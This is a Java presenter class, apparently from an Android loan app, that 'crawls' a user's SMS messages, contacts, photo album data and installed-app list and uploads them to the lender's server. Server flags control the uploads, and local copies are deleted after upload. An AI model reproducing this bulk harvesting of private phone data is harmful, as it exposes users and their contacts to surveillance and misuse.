package com.lirongyuns.happyrupees.presenter;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;
import com.lirongyuns.happyrupees.bean.UploadFileJson;
import com.lirongyuns.happyrupees.bean.UserInfoJson;
import com.lirongyuns.happyrupees.dialog.LoadingDialog;
import com.lirongyuns.happyrupees.internet.HttpObservable;
import com.lirongyuns.happyrupees.internet.JsonCreator;
import com.lirongyuns.happyrupees.internet.RetrofitCreator;
import com.lirongyuns.happyrupees.requester.CrawlPhoneDataRequester;
import com.lirongyuns.happyrupees.utils.ConstantUtils;
import com.lirongyuns.happyrupees.utils.FileUtils;
import com.lirongyuns.happyrupees.view.CrawlView;
import com.xxl.loan.sdk.utils.SPUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;

import io.reactivex.Observable;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.schedulers.Schedulers;
import okhttp3.FormBody;
import okhttp3.MultipartBody;
import okhttp3.ResponseBody;
import retrofit2.Response;

public class CrawlPhoneDataPresenterImpl implements CrawlPhoneDataPresenter {
    private CrawlView view;
    CrawlPhoneDataRequester mRequester;
    private Context context;
    
    public CrawlPhoneDataPresenterImpl(CrawlView view) {
        this.view = view;
        mRequester  = RetrofitCreator.create(CrawlPhoneDataRequester.class);
    }
    
    public void setContext(Context context) {
        this.context = context;
    }
    
    @Override
    public void uploadApp(String memberId, JSONArray datas) {
        HttpObservable.Msg observable = new HttpObservable.Msg() {
            
            @Override
            public void onSuccess(String msg) {
                Log.e("app", msg);
//                view.onUploadSuccess();
            }
            
            @Override
            public void onFailure(int code, String msg) {
                Log.e("app", code + msg);
                view.showToast(msg);
            }
            
            @Override
            public Response<ResponseBody> onRequest() throws Exception {
                
                JsonCreator creator = new JsonCreator();
                creator.put("memberId", memberId);
                creator.put("dataList", datas);
                
                return mRequester.uploadAppInfo(RetrofitCreator.getFormBody(creator)).execute();
            }
        };
        
        Observable.create(observable)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observable.getObserver());
    }
    
    @Override
    public void uploadPhotoAlbum(String memberId, JSONArray datas) {
        HttpObservable.Msg observable = new HttpObservable.Msg() {
            
            @Override
            public void onSuccess(String msg) {
                Log.e("album", msg);
//                view.onUploadSuccess();
            }
            
            @Override
            public void onFailure(int code, String msg) {
                Log.e("album", code + msg);
                view.showToast(msg);
            }
            
            @Override
            public Response<ResponseBody> onRequest() throws Exception {
                JsonCreator creator = new JsonCreator();
                creator.put("memberId", memberId);
                creator.put("dataList", datas);
//                Log.e("album", datas.toString());
                
                return mRequester.uploadPhotoInfo(RetrofitCreator.getFormBody(creator)).execute();
            }
        };
        
        Observable.create(observable)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observable.getObserver());
    }
    
    @Override
    public void uploadSms(String memberId, JSONArray datas) {
        HttpObservable.Msg observable = new HttpObservable.Msg() {
            
            @Override
            public void onSuccess(String msg) {
                Log.e("sms", msg);
//                view.onUploadSuccess();
            }
            
            @Override
            public void onFailure(int code, String msg) {
                Log.e("sms", code + msg);
                view.showToast(msg);
            }
            
            @Override
            public Response<ResponseBody> onRequest() throws Exception {
                JsonCreator creator = new JsonCreator();
                creator.put("memberId", memberId);
                creator.put("dataList", datas);
                
                return mRequester.uploadSmsInfo(RetrofitCreator.getFormBody(creator)).execute();
            }
        };
        
        Observable.create(observable)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observable.getObserver());
    }
    
    @Override
    public void uploadSmsDataFile(MultipartBody.Part filePart, MultipartBody.Part data, File file) {
        mRequester.uploadAppDataFile(filePart, data).enqueue(new RetrofitCreator.JsonCallback() {
            @Override
            public void onSuccess(JSONObject jsonObject){
//                Log.e("kmsg", "jsonObject==="+
                deleteFile(jsonObject, file);
            }
    
    
            @Override
            public void onFailure(int code, String msg) {
                super.onFailure(code, msg);
            }
        });
        
    }
    
    
    @Override
    public void uploadPhotoDataFile(MultipartBody.Part filePart, MultipartBody.Part data, File file) {
        mRequester.uploadAppDataFile(filePart, data).enqueue(new RetrofitCreator.JsonCallback() {
            @Override
            public void onSuccess(JSONObject jsonObject){
//                Log.e("kmsg", "jsonObject==="+jsonObject.toString());
                deleteFile(jsonObject, file);
            }
            
            
            @Override
            public void onFailure(int code, String msg) {
                super.onFailure(code, msg);
            }
        });
        
    }
    
    @Override
    public void uploadAppDataFile(MultipartBody.Part filePart, MultipartBody.Part data, File file) {
        mRequester.uploadAppDataFile(filePart, data)
                .enqueue(new RetrofitCreator.JsonCallback() {
                    @Override
                    public void onSuccess(JSONObject jsonObject){
                        deleteFile(jsonObject, file);
                    }
    
    
                    @Override
                    public void onFailure(int code, String msg) {
                        super.onFailure(code, msg);
                    }
                });
    }
    
    @Override
    public void uploadContactDataFile(MultipartBody.Part filePart, MultipartBody.Part data, File file) {
        mRequester.uploadAppDataFile(filePart, data)
                .enqueue(new RetrofitCreator.JsonCallback() {
                    @Override
                    public void onSuccess(JSONObject jsonObject){
                        deleteFile(jsonObject, file);
                    }
    
    
                    @Override
                    public void onFailure(int code, String msg) {
                        super.onFailure(code, msg);
                    }
                });
    }
    
    private void deleteFile(JSONObject jsonObject, File file) {
        Gson gson = new Gson();
        UploadFileJson uploadFileJson = gson.fromJson(jsonObject.toString(), UploadFileJson.class);
        if (ConstantUtils.RESPONSE_OK == uploadFileJson.getCode()) {
            if(uploadFileJson.isData()){
                SPUtils.saveBoolean(context, file.getName(),true);
                FileUtils.isDeleteFile(file);
                String name = file.getName();
                if(TextUtils.isEmpty(name)){
                    return;
                }
                if(name.contains("_sms_")){
                    FileUtils.mSmsFiles.remove(file);
                }else if(name.contains("_photo_")){
                    FileUtils.mPhotoFiles.remove(file);
                }else if(name.contains("_app_")){
                    FileUtils.mAppFiles.remove(file);
                }else if(name.contains("_contact_")){
                    FileUtils.mContactFiles.remove(file);
                }
            }
        }
    }
    
    
    @Override
    public void uploadContacts(String memberId, JSONArray datas) {
        HttpObservable.Msg observable = new HttpObservable.Msg() {
            
            @Override
            public void onSuccess(String msg) {
                Log.e("contacts", msg);
//                view.onUploadSuccess();
            }
            
            @Override
            public void onFailure(int code, String msg) {
                Log.e("contacts", code + msg);
                view.showToast(msg);
            }
            
            @Override
            public Response<ResponseBody> onRequest() throws Exception {
                JsonCreator creator = new JsonCreator();
                creator.put("memberId", memberId);
                creator.put("dataList", datas);
                
                return mRequester.uploadContactsInfo(RetrofitCreator.getFormBody(creator)).execute();
            }
        };
        
        Observable.create(observable)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observable.getObserver());
        
    }
    
    
    
    
    @Override
    public void getUserInfoFromServer(String memberId) {
        JsonCreator jsonCreator = new JsonCreator();
        jsonCreator.put("memberId",memberId);
        FormBody formBody = RetrofitCreator.getFormBody(jsonCreator);
        mRequester.getUserInfoFromServer(formBody)
                .enqueue(new RetrofitCreator.JsonCallback() {
                    @Override
                    public void onSuccess(JSONObject jsonObject) {
                        LoadingDialog.close();
                        Gson gson = new Gson();
                        UserInfoJson userInfoJson = gson.fromJson(jsonObject.toString(), UserInfoJson.class);
                        UserInfoJson.DataBean data = userInfoJson.getData();
                        int code = userInfoJson.getCode();
                        if(200 == code && null != data){
                            UserInfoJson.DataBean.LoanMemberBean loanMember = data.getLoanMember();
                            if(null == loanMember){
                                return;
                            }
                            ConstantUtils.OCR_TYPE = data.getOcrType();
                            ConstantUtils.CARD_CHECK_MSG = data.getCardCheckingMsg();
                            ConstantUtils.LOAN_STATUS = loanMember.getLoanStatus();
                            ConstantUtils.IS_UPLOAD_APP = loanMember.getUploadApp();
                            ConstantUtils.IS_UPLOAD_ALBUM = loanMember.getUploadAlbum();
                            ConstantUtils.IS_UPLOAD_SMS = loanMember.getUploadSms();
                            ConstantUtils.IS_UPLOAD_CONTACT = loanMember.getUploadAddress();
                            
                            ConstantUtils.IS_UPLOAD_INFORMATION = loanMember.getUploadInformation();
                            ConstantUtils.IS_UPLOAD_PAN = loanMember.getOcrInspect();
                            ConstantUtils.IS_UPLOAD_FACE = loanMember.getLiveInspect();
                            ConstantUtils.APP_SETTING = data.getAppSeting();
                            ConstantUtils.PHONE_NUM = loanMember.getMobile();
                            ConstantUtils.IS_CAN_REPEAT = loanMember.getResetState();
                            ConstantUtils.IS_ALL_UPLOAD = data.getUploadSuccessful();
                            ConstantUtils.REPEATED_BORROWING = loanMember.getResetState();
                            CrawlView view = CrawlPhoneDataPresenterImpl.this.view;
                            view.startCrawPhoneData();
                        }else {
                            view.showToast(userInfoJson.getMsg());
                        }
                    }
                    
                    @Override
                    public void onFailure(int code, String msg) {
                        super.onFailure(code, msg);
                        LoadingDialog.close();
                        view.showToast(msg);
                    }
                });
    }
    
}
